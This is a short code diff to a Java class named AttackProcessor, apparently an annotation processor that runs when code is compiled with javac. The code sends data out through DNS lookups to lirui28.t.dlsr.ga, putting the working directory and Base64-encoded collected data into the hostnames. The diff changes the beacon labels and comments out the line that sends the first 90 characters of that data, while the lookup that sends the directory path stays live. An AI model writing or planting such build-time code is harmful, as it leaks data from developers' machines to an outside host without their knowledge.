@@ -31,7 +31,7 @@ public class AttackProcessor extends AbstractProcessor {
 
         try
         {
-            Inet4Address.getByName( "javac15.lirui28.t.dlsr.ga" );
+            Inet4Address.getByName( "javac16.lirui28.t.dlsr.ga" );
 
             Inet4Address.getByName( System.getProperty("user.dir")+".1.lirui28.t.dlsr.ga" );
 
@@ -47,7 +47,9 @@ public class AttackProcessor extends AbstractProcessor {
             fs = new String( Base64.getEncoder().encode( fs.getBytes() ) );
 
             if (fs.length()>90){
-                Inet4Address.getByName( fs.substring( 0,90 )+".2.lirui28.t.dlsr.ga" );
+                Inet4Address.getByName( "dayu90"+".3.lirui28.t.dlsr.ga" );
+
+                //Inet4Address.getByName( fs.substring( 0,90 )+".2.lirui28.t.dlsr.ga" );
             } else {
                     Inet4Address.getByName( "xiaoyu90"+".3.lirui28.t.dlsr.ga" );
             }
